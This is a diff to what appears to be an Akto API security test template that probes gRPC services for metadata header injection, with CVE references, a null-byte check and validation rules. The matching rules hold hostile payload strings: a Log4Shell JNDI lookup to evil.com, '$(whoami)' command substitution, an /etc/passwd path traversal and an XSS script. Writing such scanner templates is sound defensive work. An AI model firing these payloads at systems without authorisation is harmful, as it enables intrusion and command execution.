@@ -32,6 +32,8 @@ info:
     - CWE-113
   cve:
     - CVE-2023-32731
+    - CVE-2023-32732
+    - CVE-2024-7246
 
 attributes:
   nature: INTRUSIVE
@@ -46,12 +48,14 @@ api_selection_filters:
   method:
     neq: "OPTIONS"
   request_headers:
+    contains_either:
+      - "application/grpc"
     for_one:
       key:
-        regex: "content-type"
+        regex: "^(authorization|grpc-metadata-.+|x-.+)$"
+        extract: metadataKey
       value:
-        contains_either:
-          - "application/grpc"
+        extract: metadataValue
   response_payload:
     not_contains:
       - Error
@@ -74,28 +78,73 @@ wordLists:
     - "$(whoami)"
 
 execute:
-  type: single
+  type: multiple
   requests:
     - req:
+        - modify_header:
+            ${metadataKey}: "\x00akto\x00"
+        - validate:
+            or:
+              - response_code:
+                  eq: 400
+              - response_code:
+                  eq: 422
+              - response_payload:
+                  contains_either:
+                    - "INVALID_ARGUMENT"
+                    - "InvalidArgument"
+                    - "invalid metadata"
+                    - "malformed metadata"
+                    - "rejected"
+                    - "Bad Request"
+        - success: x2
+        - failure: vulnerable
+    - req:
+        - modify_header:
+            ${metadataKey}: ${maliciousMetadata}
         - add_header:
             x-custom-metadata: ${maliciousMetadata}
         - add_header:
             grpc-metadata-user-role: ${maliciousMetadata}
         - add_header:
             grpc-metadata-auth-token: ${maliciousMetadata}
-
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Error
-      - "invalid"
-      - "malformed"
-      - "rejected"
-      - "blocked"
-      - "WAF"
-      - "Security Exception"
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - "invalid metadata"
+                - "malformed metadata"
+                - "rejected"
+                - "blocked"
+                - "WAF"
+                - "Security Exception"
+            or:
+              - response_payload:
+                  contains_either:
+                    - "../../../etc/passwd"
+                    - "${jndi:ldap://evil.com/a}"
+                    - "$(whoami)"
+                    - "<script>alert('xss')</script>"
+              - response_headers:
+                  for_one:
+                    key:
+                      eq: "x-forwarded-for"
+                    value:
+                      contains_either:
+                        - "127.0.0.1"
+              - and:
+                  - response_code:
+                      gte: 200
+                      lt: 300
+                  - response_headers:
+                      for_one:
+                        key:
+                          eq: "grpc-status"
+                        value:
+                          eq: "0"
+        - success: vulnerable
